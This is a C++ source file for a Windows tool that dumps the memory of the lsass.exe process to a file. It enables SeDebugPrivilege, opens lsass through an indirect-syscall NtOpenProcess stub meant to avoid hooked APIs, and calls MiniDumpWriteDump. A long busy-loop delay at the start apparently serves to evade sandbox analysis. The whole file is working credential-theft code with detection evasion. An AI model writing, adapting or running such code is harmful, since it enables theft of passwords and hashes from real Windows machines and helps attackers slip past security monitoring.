#include <windows.h>
#include <processthreadsapi.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <tchar.h>
#include <ntstatus.h>
#include <iostream>
#include <shlwapi.h>
#include "syscalls.h"
// #pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "shlwapi.lib")

// int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR
// lpCmdLine, int nCmdShow) {
//
typedef BOOL(WINAPI* MiniDumpWriteDump_t)(HANDLE hProcess, DWORD ProcessId, HANDLE hFile,
                                          DWORD DumpType, PVOID ExceptionParam,
                                          PVOID UserStreamParam, PVOID CallbackParam);
DWORD wNtOpenProcess;
UINT_PTR sysAddrNtOpenProcess;

int FindTarget(const char* procname) {
        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;

        // Take a snapshot of all the processes currently running
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (INVALID_HANDLE_VALUE == hProcSnap)
                return 0;

        // PROCESSENTRY32 is a struct that holds process info
        // setting dwSize ensure the code works correctly on 32-bit and 64-bit envs
        pe32.dwSize = sizeof(PROCESSENTRY32);

        // Check if any processes are currently running
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }

        while (Process32Next(hProcSnap, &pe32)) {
                // lstrcmpiA ignore the capitalization of the process letters
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }

        CloseHandle(hProcSnap);

        return pid;
}

BOOL setPrivilege(LPCTSTR privilegeName) {
        HANDLE hToken = NULL;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                              &hToken)) {
                printf("OpenProcessToken failed");
                return FALSE;
        }

        LUID luid;
        if (!LookupPrivilegeValueA(NULL, privilegeName, &luid)) {
                printf("LookupPrivilegeValue failed");
                CloseHandle(hToken);
                return FALSE;
        }

        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        SetLastError(0);
        if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
                printf("AdjustTokenPrivileges failed");
                CloseHandle(hToken);
                return FALSE;
        }
        DWORD e = GetLastError();
        if (e == ERROR_NOT_ALL_ASSIGNED) {
                printf("failed");
                CloseHandle(hToken);
                return FALSE;
        }

        CloseHandle(hToken);
        return TRUE;
}
void compute_delay(void) {
        volatile long long sum = 0;
        volatile long long i = 0;

        for (i = 0; i < 3000000000LL; i++) {
                sum += i;
                sum - (i / 2);
                sum *= (i % 7 + 1);
        }
}

int main(void) {
        compute_delay();
        if (!setPrivilege(SE_DEBUG_NAME)) {
                printf("[-] Cannot enable SeDebugPrivilege\n");
                return 1;
        }
        printf("[+] SeDebugPrivilege enabled\n");

        const char* procname = "lsass.exe";
        // const char* procname = "notepad.exe";

        int pid = FindTarget(procname);

        printf("  PID: %u\n", pid);

        // Trying Indirect Syscall for OpenProcess
        // Get the handle of NTDLL
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

        // Get the addr of the target function
        UINT_PTR pNtOpenProcess = (UINT_PTR)GetProcAddress(hNtdll, "NtOpenProcess");

        // Here we read the syscall number
        // Usually located at the 4th byte of the function
        wNtOpenProcess = ((unsigned char*)(pNtOpenProcess + 4))[0];

        // Here we directly get the addr of the syscall stub (the actual syscall instruction)
        // This is the diff between direct and indirect syscall
        sysAddrNtOpenProcess = pNtOpenProcess + 0x12;

        CLIENT_ID cid = {(HANDLE)(ULONG_PTR)pid, NULL};
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

        HANDLE hLsass = NULL;
        NTSTATUS status =
            NtOpenProcess(&hLsass, PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, &oa, &cid);

        if (status != STATUS_SUCCESS) {
                printf("[-] OpenProcess failed: %lu\n", GetLastError());
        }

        // Create a new file and get its handle
        HANDLE hFile = CreateFileA("lsass.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                                   FILE_ATTRIBUTE_NORMAL, NULL);

        if (hFile == INVALID_HANDLE_VALUE) {
                printf("[-] CreateFile failed: %lu\n", GetLastError());
                CloseHandle(hLsass);
        }
        HMODULE hDbgHelp = LoadLibrary("dbghelp.dll");

        if (hDbgHelp == NULL) {
                printf("[-] LoadLibrary(dbghelp.dll) failed: %lu\n", GetLastError());
                return 1;
        }
        printf("[+] dbghelp.dll loaded: 0x%p\n\n", hDbgHelp);

        MiniDumpWriteDump_t pMiniDump =
            (MiniDumpWriteDump_t)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");

        if (pMiniDump == NULL) {
                printf("[-] GetProcAddress(MiniDumpWriteDump) failed: %lu\n", GetLastError());
                FreeLibrary(hDbgHelp);
                return 1;
        }
        printf("[+] MiniDumpWriteDump found: 0x%p\n\n", pMiniDump);

        printf("  Trying to dump the process memory...\n");
        BOOL dump = pMiniDump((HANDLE)hLsass, (DWORD)pid, (HANDLE)hFile, 2, NULL, NULL, NULL);

        if (!dump) {
                printf("[-] The dump failed: %lu\n", GetLastError());
        } else {
                printf("The dump succeeded !!!!\n");
        }

        CloseHandle(hFile);
        CloseHandle(hLsass);

        return 0;
}
